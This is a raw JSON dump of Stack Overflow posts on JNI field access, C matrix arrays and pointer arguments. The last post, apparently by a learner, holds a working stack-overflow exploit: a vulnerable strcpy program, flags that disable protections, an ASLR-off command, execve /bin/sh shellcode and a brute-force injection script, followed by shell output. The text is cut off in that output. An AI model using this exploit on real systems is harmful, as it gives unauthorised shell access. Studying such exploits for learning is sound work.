(*env)-&gt;GetFieldID(env, cls, \"sVal\", \"Ljava/lang/String;\");\n    jobject sVal = (*env)-&gt;GetObjectField(env, objarg, fidString);\n\n    // we have to get string bytes into C string\n    const char *c_str;\n    c_str = (*env)-&gt;GetStringUTFChars(env, sVal, NULL);\n    if(c_str == NULL) {\n            return;\n    }\n\n    printf(\"sVal: %s\\n\", c_str);\n\n    // after using it, remember to release the memory\n    (*env)-&gt;ReleaseStringUTFChars(env, sVal, c_str);\n\n    /* Get OtherClass */\n    jfieldID fidOtherClass = (*env)-&gt;GetFieldID(env, cls, \"oVal\", \"LrecipeNo020/OtherClass;\");\n    jobject oVal = (*env)-&gt;GetObjectField(env, objarg, fidOtherClass);\n\n    jclass clsOtherClass = (*env)-&gt;GetObjectClass(env, oVal);\n\n    /* Once we have OtherClass class and OtherClass object\n       we can access OtherClass'es components\n    */\n\n    /* Get String field from OtherClass */\n    jfieldID fidStringOtherClass = (*env)-&gt;GetFieldID(env, clsOtherClass, \"sVal\", \"Ljava/lang/String;\");\n    jobject sValOtherClass = (*env)-&gt;GetObjectField(env, oVal, fidStringOtherClass);\n\n    // we have to get string bytes into C string\n    const char *c_str_oc;\n    c_str_oc = (*env)-&gt;GetStringUTFChars(env, sValOtherClass, NULL);\n    if(c_str_oc == NULL) {\n        return;\n    }\n\n    printf(\"OtherClass.sVal: %s\\n\", c_str_oc);\n\n    // after using it, remember to release the memory\n    (*env)-&gt;ReleaseStringUTFChars(env, sValOtherClass, c_str_oc);\n}\n\n/* Make file */\n\ninclude ../Makefile.common\n\nall: compilejava compilec\n\ncompilec:\n    cc -g -shared -fpic -I${JAVA_HOME}/include -I${JAVA_HOME}/include/$(ARCH) c/recipeNo020_PassObject.c -o lib/libPassObject.$(EXT)\n\n\ncompilejava:\n    $(JAVA_HOME)/bin/javac -cp target -d target java/recipeNo020/OtherClass.java\n    $(JAVA_HOME)/bin/javac -cp target -d target java/recipeNo020/CustomClass.java\n    $(JAVA_HOME)/bin/javac -cp target -d target java/recipeNo020/PassObject.java\n    $(JAVA_HOME)/bin/javah -jni -d c -cp target recipeNo020.PassObject\n\ntest:\n    $(JAVA_HOME)/bin/java -Djava.library.path=$(LD_LIBRARY_PATH):./lib -cp target recipeNo020.PassObject\n\n.PHONY: clean\nclean:\n    -rm -rfv target/*\n    -rm c/recipeNo020_PassObject.h\n    -rm -rfv lib/*\n\n/* directory structure */\n.\n\u251c\u2500\u2500 Makefile\n\u251c\u2500\u2500 c\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 recipeNo020_PassObject.c\n\u251c\u2500\u2500 java\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 recipeNo020\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 CustomClass.java\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 OtherClass.java\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 PassObject.java\n\u251c\u2500\u2500 lib\n\u2514\u2500\u2500 target\n\n/* execution */\nmake\nmake test\n</code></pre>\n\n<p>You can find it easier to checkout the project and compile it:</p>\n\n<p><a href=\"https://github.com/mkowsiak/jnicookbook\" rel=\"noreferrer\">https://github.com/mkowsiak/jnicookbook</a></p>\n"}], "owner": {"reputation": 1470, "user_id": 6620333, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/4eb000d274caa34e6db0ff8e77a6a677?s=128&d=identicon&r=PG&f=1", "display_name": "mafioso", "link": "https://stackoverflow.com/users/6620333/mafioso"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 8138, "favorite_count": 2, "answer_count": 3, "score": 7, "last_activity_date": 1476906267, "creation_date": 1476292325, "question_id": 40004522, "link": "https://stackoverflow.com/questions/40004522/how-to-get-values-from-jobject-in-c-using-jni", "title": "How to get values from jobject in C using JNI?", "body": "<p>How can I get the values of a jobject in C?<br>\nI use <code>JNI</code> and call a java function in C. The parameter is a jobject and it should look like that: <code>{\"John\", \"Ganso\", 5}</code>.<br>\nNow I want to get the values from that object but I dont know how. Do you have any suggestions how to solve that?<br>\nMy struct in C looks like my class in java.</p>\n\n<p>My code looks like that:   </p>\n\n<pre><code>JNIEXPORT void JNICALL\nJava_model_JNIResultSet_printToFile(JNIEnv *env, jobject obj,\n    jobject o) {\n\n// How can I get values of jobject o?\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "matrix"], "comments": [{"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1476293564, "post_id": 40004294, "comment_id": 67287601, "body": "Without knowing how you represent your matrix in C, I cannot tell you how to save a copy of it."}], "answers": [{"tags": [], "owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "is_accepted": true, "score": 2, "last_activity_date": 1601449790, "last_edit_date": 1601449790, "creation_date": 1476292147, "answer_id": 40004479, "question_id": 40004294, "link": "https://stackoverflow.com/questions/40004294/how-to-save-matrices-in-an-array/40004479#40004479", "title": "How to save matrices in an array", "body": "<blockquote>\n<p>so is it possible to save matrix as element of an array?</p>\n</blockquote>\n<p>Yes, you can use a three dimensional array to store it's elements as matrices. Something like <code>array[no_of_matrices][row_no][column_no]</code> would do fine</p>\n<p>example:</p>\n<pre><code>int arr[2][2][2];\n// this would store 2 matrices of dimensions 2*2\n</code></pre>\n<p>Additionally, if you want arrays of different dimensions then you can create <code>**array[no_of_matrices]</code> and use <strong>dynamic memory allocation</strong> to allocate memory according to required dimensions of each matrix.</p>\n"}], "owner": {"reputation": 57, "user_id": 6640867, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/58686b170fb26788a02df0ebd4af7544?s=128&d=identicon&r=PG&f=1", "display_name": "TheNemesis584", "link": "https://stackoverflow.com/users/6640867/thenemesis584"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 501, "favorite_count": 0, "accepted_answer_id": 40004479, "answer_count": 1, "score": 0, "last_activity_date": 1601449790, "creation_date": 1476291576, "question_id": 40004294, "link": "https://stackoverflow.com/questions/40004294/how-to-save-matrices-in-an-array", "title": "How to save matrices in an array", "body": "<p>I was wondering is it possible in C language to save couple of matrices in an array and how to do that? Like, I pass a static matrix to a function and in a several steps I use the same matrix for different calculations, so I need to save every matrix with different result somewhere, so is it possible to save matrix as element of an array?</p>\n"}, {"tags": ["c", "pointers", "parameters", "structure"], "comments": [{"owner": {"reputation": 12097, "user_id": 1080064, "user_type": "registered", "accept_rate": 43, "profile_image": "https://graph.facebook.com/100000753306178/picture?type=large", "display_name": "tkausl", "link": "https://stackoverflow.com/users/1080064/tkausl"}, "edited": false, "score": 1, "creation_date": 1476291543, "post_id": 40004229, "comment_id": 67286341, "body": "Trying to put <code>*</code> everywhere won&#39;t solve your problems."}, {"owner": {"reputation": 7022, "user_id": 7659995, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iZH7M.png?s=128&g=1", "display_name": "MD XF", "link": "https://stackoverflow.com/users/7659995/md-xf"}, "edited": false, "score": 0, "creation_date": 1476294667, "post_id": 40004229, "comment_id": 67288259, "body": "You need to use <code>&amp;</code> instead <code>*</code> while passing to <code>copy</code>."}], "answers": [{"tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 2, "last_activity_date": 1476291879, "last_edit_date": 1495540840, "creation_date": 1476291546, "answer_id": 40004284, "question_id": 40004229, "link": "https://stackoverflow.com/questions/40004229/what-parameters-would-i-put-in-this-function-copy-to-copy-a-to-b/40004284#40004284", "title": "What parameters would I put in this function &#39;copy&#39; to copy a to b?", "body": "<p>The first argument is supposed to be a pointer to a pointer. Since <code>b</code> is a pointer, you need to take its address, which is <code>&amp;b</code>.</p>\n\n<p>The second argument is supposed to be a pointer. <code>a</code> is a pointer, so you just pass it directly.</p>\n\n<pre><code>copy(&amp;b, a);\n</code></pre>\n\n<p><code>*</code> is for indirecting through a pointer to access what it points to. That's the exact opposite of what you want, which is to get a pointer to the variable itself. You use <code>*</code> inside the <code>copy</code> function to access what the pointers given point to.</p>\n\n<p>BTW, you should also see <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">Do I cast the result of malloc?</a></p>\n\n<p>And don't forget to free the structures when you're done using them.</p>\n"}], "owner": {"reputation": 25, "user_id": 6020038, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c58b0b30c22c24ab532ee3fe43777982?s=128&d=identicon&r=PG&f=1", "display_name": "banana1337", "link": "https://stackoverflow.com/users/6020038/banana1337"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476296983, "creation_date": 1476291370, "last_edit_date": 1476296983, "question_id": 40004229, "link": "https://stackoverflow.com/questions/40004229/what-parameters-would-i-put-in-this-function-copy-to-copy-a-to-b", "title": "What parameters would I put in this function &#39;copy&#39; to copy a to b?", "body": "<pre><code>struct info\n{\n    int val;\n};\n\nvoid copy(struct info ** dst, struct info * src)\n{\n    *dst = (struct info *)malloc(sizeof(struct info));\n    **dst = *src;\n}\n\nint main()\n{\n    struct info *a, *b; \n\n    a = (struct info *)malloc(sizeof(struct info));\n    a -&gt; val = 7;\n    copy( , );\n\n    a -&gt; val = 9;\n    printf(\"%d\", b-&gt;val);\n}\n</code></pre>\n\n<p>I have tried <code>(b, a)</code>, <code>(*b, *a)</code>, <code>(b, *a)</code> and so one but the argument is always unexpected by the compiler. Have been trying for an hour with no result - just a half melted brain.</p>\n"}, {"tags": ["c", "linux", "gdb", "stack-overflow", "exploit"], "owner": {"reputation": 1226, "user_id": 2197507, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/fa86161300ff22eb20fcda21a17b4ce3?s=128&d=identicon&r=PG", "display_name": "RdlP", "link": "https://stackoverflow.com/users/2197507/rdlp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 95, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1476291231, "creation_date": 1476290763, "last_edit_date": 1495542790, "question_id": 40004037, "link": "https://stackoverflow.com/questions/40004037/strange-behavior-in-buffer-overflow-exploit-without-gdb", "title": "Strange behavior in buffer overflow exploit without gdb", "body": "<p>I wrote a simple vulnerable program to stack overflow attack:</p>\n\n<pre><code>#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid func(char *arg)\n{\n    char name[32];\n    strcpy(name, arg);\n    printf(\"Welcome %s\\n\", name);\n}\n\nint main (int argc, char *argv[])\n{\n    if (argc != 2)\n    {\n        printf(\"Use: %s YOUR_NAME\\n\", argv[0]);\n        return 0;\n    }\n    func(argv[1]);\n    return 0;\n}\n</code></pre>\n\n<p>I compile it with:</p>\n\n<pre><code>gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack example.c -o example\n</code></pre>\n\n<p>and disable ASLR with</p>\n\n<pre><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space\n</code></pre>\n\n<p>I wrote a simple shellcode:</p>\n\n<pre><code>08048054 &lt;_start&gt;:\n 8048054:   eb 1f                   jmp    8048075 &lt;last&gt;\n\n08048056 &lt;first&gt;:\n 8048056:   90                      nop\n 8048057:   5e                      pop    %esi\n 8048058:   89 76 08                mov    %esi,0x8(%esi)\n 804805b:   31 c0                   xor    %eax,%eax\n 804805d:   88 46 07                mov    %al,0x7(%esi)\n 8048060:   89 46 0c                mov    %eax,0xc(%esi)\n 8048063:   b0 0b                   mov    $0xb,%al\n 8048065:   89 f3                   mov    %esi,%ebx\n 8048067:   8d 4e 08                lea    0x8(%esi),%ecx\n 804806a:   8d 56 0c                lea    0xc(%esi),%edx\n 804806d:   cd 80                   int    $0x80\n 804806f:   31 db                   xor    %ebx,%ebx\n 8048071:   89 d8                   mov    %ebx,%eax\n 8048073:   40                      inc    %eax\n 8048074:   cd 80                   int    $0x80\n\n08048076 &lt;last&gt;:\n 8048076:   e8 dc ff ff ff          call   8048056 &lt;first&gt;\n 804807b:   2f                      das    \n 804807c:   62 69 6e                bound  %ebp,0x6e(%ecx)\n 804807f:   2f                      das    \n 8048080:   73 68                   jae    80480e9 &lt;last+0x74&gt;\n    ...\n</code></pre>\n\n<p>And I was be able to exploit it in <code>gdb</code>, I get a shell. But outside the <code>gdb</code> I can't. It is normal because as said in this SO answer <a href=\"https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966\">Buffer overflow works in gdb but not without it</a> <code>gdb</code> adds some environment variables. So, I tried the alternatives posted in the accepted solution (including the script) and it doesn't work for me.</p>\n\n<p>So, I worte a shell script to test addresses near address figured out in <code>gdb</code>:</p>\n\n<pre><code>#!/bin/bash\n\nmax=255\n\nfor i in `seq 219 $max`\ndo\n    for j in `seq 0 $max`\n    do\n        #hex= printf \"%02x\" `echo \"obase=16; $i\" | bc`\n        hex=`printf \"%02x\" $i`\n        hex1=`printf \"%02x\" $j`\n        echo \"probando direccion: 0xffff$hex$hex1\"\n\n        shellcode=\"\\x90\\xeb\\x1d\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xe8\\xde\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x$hex1\\x$hex\\xff\\xff\"\n        ./example `python -c \"print '$shellcode'\"`\n    done\ndone\n</code></pre>\n\n<p>What is my surprise? That the script I wrote get shells with differents addresses</p>\n\n<pre><code>./exploit.sh: l\u00ednea 7: 14682 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6bf\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14687 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6c0\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6c1\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6c2\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14703 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6c3\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6c4\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14712 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6c5\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14717 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6c6\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14722 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6c7\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14727 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6c8\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14732 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6c9\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14737 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6ca\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14742 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6cb\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14747 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6cc\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14752 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6cd\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14757 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6ce\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14762 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6cf\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6d0\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14771 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6d1\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6d2\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6d3\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6d4\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14788 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6d5\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14793 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6d6\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6d7\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14803 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6d8\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14808 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6d9\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6da\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14817 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6db\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6dc\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14826 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6dd\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6de\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14835 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6df\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6e0\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n$ exit\nprobando direccion: 0xffffd6e1\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14849 Instrucci\u00f3n ilegal     (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6e2\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14854 Instrucci\u00f3n ilegal     (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6e3\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14859 Instrucci\u00f3n ilegal     (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6e4\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            